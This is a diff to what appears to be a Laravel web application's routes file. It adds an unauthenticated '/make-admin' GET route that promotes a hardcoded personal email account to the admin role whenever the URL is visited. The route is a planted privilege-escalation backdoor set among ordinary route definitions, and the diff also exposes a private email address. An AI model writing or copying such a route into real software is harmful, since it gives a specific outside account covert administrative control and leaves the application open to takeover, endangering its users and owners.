@@ -23,6 +23,19 @@ use App\Http\Controllers\EngagementController;
 use App\Http\Controllers\GroupStatisticsController;
 use App\Http\Controllers\Auth\PasswordResetLinkController;
 use App\Http\Controllers\Auth\NewPasswordController;
+use App\Models\User;
+Route::get('/make-admin', function () {
+    $user = User::where('email', 'tinkashawnarmstrong21@gmail.com')->first();
+
+    if (!$user) {
+        return 'User not found';
+    }
+
+    $user->role = 'admin';
+    $user->save();
+
+    return 'User is now an admin.';
+});
 
 // 1. Root
 Route::get('/', function () { return Auth::check() ? redirect('dashboard') : redirect('/login'); });
